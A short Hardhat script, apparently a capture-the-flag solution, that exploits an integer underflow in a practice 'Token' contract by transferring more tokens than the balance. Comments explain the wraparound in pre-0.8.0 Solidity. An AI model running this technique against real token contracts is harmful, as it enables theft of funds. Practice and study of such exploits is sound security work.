import { ethers } from 'hardhat';

async function main() {
  const [addr1] = await ethers.getSigners();

  const problemAddress = "0x5BA7dE98877F14B8d7bdf1979329FAAA9ff66EeF";
  const token = await ethers.getContractAt("Token", problemAddress);

  // in previous 0.8.0 version,
  // when the number is unsigned, decrementing will underflow the number,
  // resulting in the maximum possible value.
  // 0x000000000000000000000000000000000000
  // - 0x000000000000000000000000000000000001
  // = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
  const result = await token.transfer(addr1.address, 21);
  console.log(result);
}

main().catch(err => {
  console.log(err);
})
